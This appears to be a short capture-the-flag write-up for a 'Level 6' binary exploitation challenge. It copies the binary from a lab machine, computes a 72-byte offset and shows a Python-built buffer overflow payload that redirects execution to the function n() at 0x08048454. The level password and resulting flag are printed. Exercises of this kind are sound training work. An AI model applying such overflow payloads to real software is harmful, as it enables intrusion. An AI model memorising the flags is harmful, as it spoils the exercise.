# Level 6
*password : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31*

```
$ scp -P 4242 level6@192.168.56.108:level6 binary/
```

0x40 = 64

`n()` address : 0x08048454

## Buffer overflow

offset = 4 * 2 = 8
64 + 8 = 72

```
$ ./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
